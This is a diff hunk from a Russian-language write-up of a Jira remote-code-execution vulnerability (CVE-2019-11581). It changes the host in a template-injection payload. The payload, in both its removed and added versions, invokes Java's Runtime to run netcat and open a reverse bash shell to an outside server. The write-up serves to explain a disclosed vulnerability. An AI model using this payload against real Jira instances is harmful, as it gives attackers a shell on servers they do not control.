@@ -8,7 +8,7 @@ Remote code execution in Atlassian Jira(CVE-2019–11581) through template engin
 Jira использует компилирующий обработчик шаблонов - [FreeMaker](https://ru.wikipedia.org/wiki/FreeMarker), написанный на Java.
 Зная это, получается сгенерировать несложный Payload.
 
-```$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('nc -e /bin/bash r0hack.xyz 80').waitFor()```
+```$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('nc -e /bin/bash server.com 80').waitFor()```
 
 ![Image](https://downloader.disk.yandex.ru/preview/8aa9e1a7214395199fa69ba66aed75beb64bf6ba00d0b72d690a9bd8018afb8a/5d2e2aea/4FcDW08Vat-NVoVf6aWDVnDD_gIthqJIYIA_7RnszcLyB_bZTnYKFluDNTr71ayqNZ0SsUQajOnt62LXVqNhuw%3D%3D?uid=0&filename=rceinjira1.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&owner_uid=0&tknv=v2&size=2048x2048)
 
